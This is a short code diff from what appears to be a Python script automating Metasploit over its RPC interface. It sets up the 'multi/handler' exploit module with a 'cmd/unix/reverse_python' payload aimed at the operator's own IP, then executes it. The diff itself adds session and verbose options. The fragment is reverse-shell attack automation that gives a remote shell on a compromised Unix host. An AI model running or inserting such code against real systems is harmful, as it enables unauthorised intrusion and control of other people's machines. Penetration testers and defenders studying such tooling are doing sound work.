@@ -23,6 +23,8 @@ def main(argv):
 
     exploit = client.modules.use('exploit', 'multi/handler')
     payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    exploit['SESSION'] = 3
+    exploit['VERBOSE'] = True
     payload['LHOST'] = my_ip
 
     exploit.execute(payload=payload)
